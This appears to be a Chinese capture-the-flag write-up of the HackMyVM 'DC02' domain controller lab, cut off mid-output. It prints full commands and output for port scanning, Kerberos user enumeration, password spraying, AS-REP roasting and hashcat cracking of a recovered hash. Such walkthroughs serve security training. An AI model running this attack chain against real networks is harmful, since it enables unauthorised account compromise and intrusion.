{"pageProps":{"postData":{"id":"HackMyVMDC02","contentHtml":"<h1>DC02.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=DC02\">https://hackmyvm.eu/machines/machine.php?vm=DC02</a></p>\n</blockquote>\n<p>Notes: <strong>Second DC from me. Enjoy it.</strong></p>\n<h2>信息打点</h2>\n<pre><code class=\"hljs language-python\">// 寻找靶机IP <span class=\"hljs-number\">126</span>\nnmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>                            \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00044</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">77</span>:3D:<span class=\"hljs-number\">23</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">19</span>:C5:0F (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost <span class=\"hljs-keyword\">is</span> up.\nNmap done: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">27.99</span> seconds\n\n// 端口扫描\nnmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">17</span> EST\nStrange read error <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> (<span class=\"hljs-number\">104</span> - <span class=\"hljs-string\">'Connection reset by peer'</span>)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0014</span>s latency).\nNot shown: <span class=\"hljs-number\">65518</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">53</span>/tcp    <span class=\"hljs-built_in\">open</span>  domain\n<span class=\"hljs-number\">88</span>/tcp    <span class=\"hljs-built_in\">open</span>  kerberos-sec\n<span class=\"hljs-number\">135</span>/tcp   <span class=\"hljs-built_in\">open</span>  msrpc\n<span class=\"hljs-number\">139</span>/tcp   <span class=\"hljs-built_in\">open</span>  netbios-ssn\n<span class=\"hljs-number\">389</span>/tcp   <span class=\"hljs-built_in\">open</span>  ldap\n<span class=\"hljs-number\">445</span>/tcp   <span class=\"hljs-built_in\">open</span>  microsoft-ds\n<span class=\"hljs-number\">464</span>/tcp   <span class=\"hljs-built_in\">open</span>  kpasswd5\n<span class=\"hljs-number\">593</span>/tcp   <span class=\"hljs-built_in\">open</span>  http-rpc-epmap\n<span class=\"hljs-number\">636</span>/tcp   <span class=\"hljs-built_in\">open</span>  ldapssl\n<span class=\"hljs-number\">3268</span>/tcp  <span class=\"hljs-built_in\">open</span>  globalcatLDAP\n<span class=\"hljs-number\">3269</span>/tcp  <span class=\"hljs-built_in\">open</span>  globalcatLDAPssl\n<span class=\"hljs-number\">5985</span>/tcp  <span class=\"hljs-built_in\">open</span>  wsman\n<span class=\"hljs-number\">9389</span>/tcp  <span class=\"hljs-built_in\">open</span>  adws\n<span class=\"hljs-number\">49664</span>/tcp <span class=\"hljs-built_in\">open</span>  unknown\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">19</span>:C5:0F (Oracle VirtualBox virtual NIC)\n\n// 服务版本扫描\nnmap -sT -sV -O -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>                              \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">24</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>                                                                                                                          \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00074</span>s latency).                                                \nNot shown: <span class=\"hljs-number\">65517</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n<span class=\"hljs-number\">53</span>/tcp    <span class=\"hljs-built_in\">open</span>  domain        Simple DNS Plus\n<span class=\"hljs-number\">88</span>/tcp    <span class=\"hljs-built_in\">open</span>  kerberos-sec  Microsoft Windows Kerberos (server time: <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">26</span>:28Z)                                                                 \n<span class=\"hljs-number\">135</span>/tcp   <span class=\"hljs-built_in\">open</span>  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp   <span class=\"hljs-built_in\">open</span>  netbios-ssn   Microsoft Windows netbios-ssn                   \n<span class=\"hljs-number\">389</span>/tcp   <span class=\"hljs-built_in\">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n<span class=\"hljs-number\">445</span>/tcp   <span class=\"hljs-built_in\">open</span>  microsoft-ds?\n<span class=\"hljs-number\">464</span>/tcp   <span class=\"hljs-built_in\">open</span>  kpasswd5?\n<span class=\"hljs-number\">593</span>/tcp   <span class=\"hljs-built_in\">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class=\"hljs-number\">1.0</span>             \n<span class=\"hljs-number\">636</span>/tcp   <span class=\"hljs-built_in\">open</span>  tcpwrapped\n<span class=\"hljs-number\">3268</span>/tcp  <span class=\"hljs-built_in\">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n<span class=\"hljs-number\">3269</span>/tcp  <span class=\"hljs-built_in\">open</span>  tcpwrapped\n<span class=\"hljs-number\">5985</span>/tcp  <span class=\"hljs-built_in\">open</span>  http          Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)         \n<span class=\"hljs-number\">9389</span>/tcp  <span class=\"hljs-built_in\">open</span>  mc-nmf        .NET Message Framing                                                     \n<span class=\"hljs-number\">49674</span>/tcp <span class=\"hljs-built_in\">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class=\"hljs-number\">1.0</span>                                   \nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">19</span>:C5:0F (Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port                                                        \nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows <span class=\"hljs-number\">2022</span>|<span class=\"hljs-number\">2016</span>|<span class=\"hljs-number\">11</span>|<span class=\"hljs-number\">10</span> (<span class=\"hljs-number\">95</span>%)\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10      \nAggressive OS guesses: Microsoft Windows Server <span class=\"hljs-number\">2022</span> (<span class=\"hljs-number\">95</span>%), Microsoft Windows Server <span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">91</span>%), Microsoft Windows <span class=\"hljs-number\">11</span> 21H2 (<span class=\"hljs-number\">90</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> (<span class=\"hljs-number\">86</span>%) \nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (test conditions non-ideal).                     \nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>\n<h2>渗透</h2>\n<h3>SMB</h3>\n<p>无任何凭据和线索，只能从SMB开始</p>\n<p>当头一棒，不能使用匿名帐户，所以<code>LDAP</code>枚举用户也不能成功了</p>\n<pre><code class=\"hljs language-python\">smbclient -L <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>                                                    \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\nsession setup failed: NT_STATUS_ACCESS_DENIED\n</code></pre>\n<h3>域内用户枚举</h3>\n<p>使用<code>kerbrute</code> 来枚举用户名，字典是<code>github</code>上找的</p>\n<pre><code class=\"hljs language-python\">./kerbrute_linux_amd64 userenum --dc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -d SOUPEDECODE.LOCAL ../../<span class=\"hljs-type\">Dict</span>/SecLists-<span class=\"hljs-number\">2024.3</span>/Usernames/xato-net-<span class=\"hljs-number\">10</span>-million-usernames.txt\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1<span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.3</span> (9dad6e1) - 01/<span class=\"hljs-number\">20</span>/<span class=\"hljs-number\">25</span> - Ronnie Flathers @ropnop\n\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">36</span> >  Using KDC(s):\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">36</span> >   <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>:<span class=\"hljs-number\">88</span>\n\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">36</span> >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">36</span> >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">36</span> >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">37</span> >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">37</span> >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">39</span> >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">39</span> >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:06:<span class=\"hljs-number\">53</span> >  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:09:<span class=\"hljs-number\">22</span> >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:09:<span class=\"hljs-number\">22</span> >  [+] VALID USERNAME:       kleo2@soupedecode.local\n<span class=\"hljs-number\">2025</span>/01/<span class=\"hljs-number\">20</span> 01:09:<span class=\"hljs-number\">22</span> >  [+] VALID USERNAME:       dc01@soupedecode.local\n</code></pre>\n<p>找到好几个用户，将结果保存为<code>user.txt</code>，使用脚本将用户名截取然后保存下来</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'user.txt'</span>,<span class=\"hljs-string\">'r'</span>) <span class=\"hljs-keyword\">as</span> file1:\n    data = file1.read()\n    lines = data.splitlines()\n<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'user.txt'</span>,<span class=\"hljs-string\">'w'</span>) <span class=\"hljs-keyword\">as</span> file2:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> lines:\n        file2.write(line[line.find(<span class=\"hljs-string\">'E:'</span>)+<span class=\"hljs-number\">9</span>:line.find(<span class=\"hljs-string\">'@'</span>)]+<span class=\"hljs-string\">'\\n'</span>)\n</code></pre>\n<h3>尝试用户弱密码</h3>\n<p>使用<code>crackmapexec</code>来测试是否存在弱密码，发现<code>charlie</code>用户存在弱密码</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u user.txt -p user.txt --<span class=\"hljs-keyword\">continue</span>-on-success --no-bruteforce\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>)\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\admin:admin STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\charlie:charlie \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\Charlie:Charlie STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\administrator:administrator STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\Admin:Admin STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\Administrator:Administrator STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\CHARLIE:CHARLIE STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\ADMIN:ADMIN STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\wreed11:wreed11 STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\kleo2:kleo2 STATUS_LOGON_FAILURE \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\dc01:dc01 STATUS_LOGON_FAILURE\n</code></pre>\n<p>得到密码后，就可以通过<code>LDAP</code>来枚举域内用户名了,将结果保存为<code>res</code>使用脚本截取出来</p>\n<pre><code class=\"hljs language-python\">lookupsid.py <span class=\"hljs-string\">'SOUPEDECODE.LOCAL/charlie@192.168.56.126'</span> > res\n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'res'</span>,<span class=\"hljs-string\">'r'</span>) <span class=\"hljs-keyword\">as</span> file:\n    data = file.read()\n    lines = data.splitlines()\n<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'username.txt'</span>,<span class=\"hljs-string\">'w+'</span>) <span class=\"hljs-keyword\">as</span> file2:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> lines:\n        file2.write(line[line.find(<span class=\"hljs-string\">'\\\\'</span>) + <span class=\"hljs-number\">1</span>:line.find(<span class=\"hljs-string\">'('</span>)-<span class=\"hljs-number\">1</span>] + <span class=\"hljs-string\">'\\n'</span>)\n</code></pre>\n<p>然后再测试别的用户是否存在弱密码，结果还是只有<code>charlie</code></p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u username.txt -p username.txt --<span class=\"hljs-keyword\">continue</span>-on-success --no-bruteforce | grep [+]\nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\charlie:charlie\n</code></pre>\n<h3>再次访问SMB</h3>\n<p>通过<code>charlie</code>用户去访问SMB</p>\n<pre><code class=\"hljs language-python\">smbclient -L <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -U SOUPEDECODE.LOCAL/charlie%charlie\n\n        Sharename       <span class=\"hljs-type\">Type</span>      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting <span class=\"hljs-keyword\">with</span> SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect <span class=\"hljs-keyword\">with</span> SMB1 -- no workgroup available\n</code></pre>\n<p>最后发现<code>SYSVOL</code>里边存在东西，但是东西好像没用</p>\n<pre><code class=\"hljs language-python\">smbclient //<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>/SYSVOL -U SOUPEDECODE.LOCAL/charlie%charlie\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> ls\n  .                                   D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n  ..                                  D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n  SOUPEDECODE.LOCAL                  Dr        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n\n                <span class=\"hljs-number\">12942591</span> blocks of size <span class=\"hljs-number\">4096.</span> <span class=\"hljs-number\">10927852</span> blocks available\nsmb: \\> cd SOUPEDECODE.LOCAL\nsmb: \\SOUPEDECODE.LOCAL\\> <span class=\"hljs-built_in\">dir</span>\n  .                                   D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">47</span> <span class=\"hljs-number\">2024</span>\n  ..                                  D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n  DfsrPrivate                      DHSr        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">30</span>:<span class=\"hljs-number\">47</span> <span class=\"hljs-number\">2024</span>\n  Policies                            D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">30</span> <span class=\"hljs-number\">2024</span>\n  scripts                             D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n\n                <span class=\"hljs-number\">12942591</span> blocks of size <span class=\"hljs-number\">4096.</span> <span class=\"hljs-number\">10927852</span> blocks available\n</code></pre>\n<h3><strong>AS_REP Roasting</strong></h3>\n<p>本来想尝试<code>Kerbeoating</code>的，但是拿不到SPN</p>\n<pre><code class=\"hljs language-python\">GetUserSPNs.py SOUPEDECODE.LOCAL/charlie:charlie -dc-ip <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -request\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\nNo entries found!\n</code></pre>\n<p>看了下WP，发现可以通过 <strong>AS_REP Roasting</strong> 来进行下一步操作</p>\n<p>通过 <code>GetUserSPNs.py</code> 枚举出关闭了预认证的用户</p>\n<pre><code class=\"hljs language-python\">GetNPUsers.py -dc-ip <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> SOUPEDECODE.LOCAL/ -usersfile username.txt | grep <span class=\"hljs-string\">'SOUPEDECODE.LOCAL'</span> \n/root/.local/<span class=\"hljs-built_in\">bin</span>/GetNPUsers.py:<span class=\"hljs-number\">165</span>: DeprecationWarning: datetime.datetime.utcnow() <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">and</span> scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=<span class=\"hljs-number\">1</span>)\n$krb5asrep$<span class=\"hljs-number\">23</span>$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e\n</code></pre>\n<p>将用户的<code>hash</code>加密后的<code>Login session key</code>进行破解</p>\n<p>寻找密码类型，得知是<code>18200</code></p>\n<pre><code class=\"hljs language-python\">hashcat -h | grep Kerber  \n  <span class=\"hljs-number\">19600</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">17</span>, TGS-REP                              | Network Protocol\n  <span class=\"hljs-number\">19800</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">17</span>, Pre-Auth                             | Network Protocol\n  <span class=\"hljs-number\">28800</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">17</span>, DB                                   | Network Protocol\n  <span class=\"hljs-number\">19700</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">18</span>, TGS-REP                              | Network Protocol\n  <span class=\"hljs-number\">19900</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">18</span>, Pre-Auth                             | Network Protocol\n  <span class=\"hljs-number\">28900</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">18</span>, DB                                   | Network Protocol\n   <span class=\"hljs-number\">7500</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">23</span>, AS-REQ Pre-Auth                      | Network Protocol\n  <span class=\"hljs-number\">13100</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">23</span>, TGS-REP                              | Network Protocol\n  <span class=\"hljs-number\">18200</span> | Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">23</span>, AS-REP                               | Network Protocol\n</code></pre>\n<p>爆破密码</p>\n<pre><code class=\"hljs language-python\">hashcat -m <span class=\"hljs-number\">18200</span> <span class=\"hljs-string\">'$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e'</span> /usr/share/wordlists/rockyou.txt\n//\n$krb5asrep$<span class=\"hljs-number\">23</span>$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e:internet\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: <span class=\"hljs-number\">18200</span> (Kerberos <span class=\"hljs-number\">5</span>, etype <span class=\"hljs-number\">23</span>, AS-REP)\nHash.Target......: $krb5asrep$<span class=\"hljs-number\">23</span>$zximena448@SOUPEDECODE.LOCAL:fecb2e18..<span class=\"hljs-number\">.55585</span>e\nTime.Started.....: Mon Jan <span class=\"hljs-number\">20</span> 02:<span class=\"hljs-number\">30</span>:05 <span class=\"hljs-number\">2025</span> (<span class=\"hljs-number\">1</span> sec)\nTime.Estimated...: Mon Jan <span 